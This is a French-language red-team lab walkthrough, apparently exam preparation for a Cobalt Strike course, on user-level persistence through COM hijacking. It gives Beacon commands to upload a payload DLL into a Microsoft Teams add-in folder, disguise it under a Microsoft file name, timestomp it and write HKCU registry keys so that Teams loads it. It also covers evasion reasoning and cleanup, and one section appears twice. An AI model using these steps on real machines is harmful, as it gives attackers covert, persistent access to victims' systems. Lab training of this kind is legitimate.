# Lab — Persistence utilisateur

> **Contexte méthodologique :** cette étape correspond à la **phase 5 — User-Level Persistence**. Elle se déroule après le premier check-in du Beacon, avant Privilege Escalation et Lateral Movement. Cette méthode vise à conserver l’accès après une interruption de session, sans droits administrateur.

> **Place dans la chaîne d’attaque de l’examen :**
> ```
> Defence evasion prep → AppLocker bypass → Initial Access (beacon in msedge.exe)
>   → [THIS LAB] COM hijack persistence (user-level, no admin)
>   → Privilege Escalation (BadWindowsService registry)
>   → [Elevated-Persistence-lab.md] WMI event subscription (SYSTEM-level, admin required)
>   → Credential Access → Lateral Movement → ...
> ```

> **Pourquoi choisir un COM hijack ? Comparaison OPSEC :**
> | Technique | Admin requis | Écriture disque | Écriture Registry | Bruit |
> |-----------|-------------|------------|----------------|-------|
> | **COM hijack (HKCU)** | Non | Oui (DLL) | HKCU uniquement | Faible — chargement par processus légitime |
> | Registry Run key | Non | Oui | HKCU/HKLM | Élevé — détectable par Defender/EDR |
> | WMI subscription | Oui | Oui | Oui | Moyen — nécessite un Beacon privilégié |
>
> Le COM hijack peut fonctionner au niveau utilisateur : les modifications Registry restent dans HKCU, le Beacon est chargé par un processus Microsoft signé (Teams) et le redémarrage de Teams peut déclencher à nouveau la DLL.

> **Checklist avant ce lab :**
> - [ ] Malleable C2 Profile actif et Docker redémarré
> - [ ] Artifact Kit chargé (`artifact.cna`) — vérifier le comportement du payload DLL face à Defender
> - [ ] Beacon exécuté sous l’utilisateur cible (`pchilds`) avec au moins medium integrity
> - [ ] `spawnto` personnalisé avant la génération de la DLL

> **Classification OPSEC :** `OPSEC-🟠CAUTION`. La DLL est écrite sur disque et la configuration est modifiée dans HKCU. Le chargement d’une DLL inhabituelle par Teams peut être détecté.

===

## Payload

1. Lancer Cobalt Strike et se connecter au team server.
1. Générer un payload DLL :
    1. **Payloads > Windows Stageless Payload**
    2. Listener: **http**
    3. Output: **Windows DLL**
    4. Exit Function: **Thread**
    5. Cliquer sur **Generate**.
    6. Enregistrer dans `C:\Payloads\http_x64.dll`

⚠️ Choisir **Thread** comme Exit Function afin de ne pas terminer le processus hôte à la fermeture du Beacon.

> **Pourquoi Thread et pas Process ?** L’option Process peut fermer `ms-teams.exe` quand le Beacon se termine. Thread ferme uniquement le thread du Beacon et laisse Teams fonctionner.

===

## Payload

1. Lancer Cobalt Strike et se connecter au team server.
1. Générer un payload DLL :
    1. **Payloads > Windows Stageless Payload**
    2. Listener: **http**
    3. Output: **Windows DLL**
    4. Exit Function: **Thread**
    5. Cliquer sur **Generate**.
    6. Enregistrer dans `C:\Payloads\http_x64.dll`

⚠️ Choisir **Thread** comme Exit Function afin de ne pas terminer le processus hôte à la fermeture du Beacon.

===

## COM Hijack

Depuis le Beacon exécuté sous `pchilds` :

1. Changer le working directory du Beacon.  
```sh
cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
```
2. Uploader le payload DLL sur le disque.  
```
upload C:\Payloads\http_x64.dll
```
3. Renommer la DLL et appliquer un **timestomp** pour l’aligner sur les fichiers existants.  
```
mv http_x64.dll Microsoft.Teams.HttpClient.dll
timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
```
4. Ajouter les entrées Registry nécessaires au **COM hijack** :  
```beacon-nocolor
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"
```
4. Passer sur `lon-wkstn-1` et se connecter avec `Password` (tel qu’indiqué dans le lab)  
5. Lancer Microsoft Teams depuis le menu Démarrer.  
6. Revenir à l’Attacker Desktop, sélectionner **Link** : un nouveau Beacon doit apparaître depuis `ms-teams.exe`.  

⚠️ Cette technique utilise le COM hijack pour faire charger un payload Beacon par une application Microsoft signée.

----  

## Notes pour l’examen

**Condition de déclenchement :** redémarrage de Teams → chargement DLL → callback Beacon. Si Teams ne redémarre pas automatiquement, une nouvelle connexion utilisateur peut être nécessaire. Configurer la persistence avant de poursuivre.

**Vérification après chargement de la DLL par Teams :**
```cs
beacon> getuid          // confirm it's the correct user
beacon> process_browser // GUI tab — confirm beacon PID is inside ms-teams.exe, right-click options available
```

**Cleanup (si nécessaire avant la soumission de l’examen) :**
```cs
// Remove the registry entries
reg_delete HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}"

// Remove the DLL
rm C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll
```

**Étape suivante :** après avoir vérifié la persistence, suivre `labs/Privilege-Escalation-lab.md` pour obtenir SYSTEM, puis `labs/Elevated-Persistence-lab.md` pour la persistence WMI au niveau SYSTEM.

> **Différence avec Elevated-Persistence-lab.md :**
> - Ce lab = user-level ; déclenché au démarrage de Teams ; nécessite une session de l’utilisateur cible
> - Elevated-Persistence-lab.md = SYSTEM-level ; déclenché par une actualisation GPO (`gpupdate`) ; ne dépend pas d’une session interactive, mais nécessite d’abord un Beacon SYSTEM.

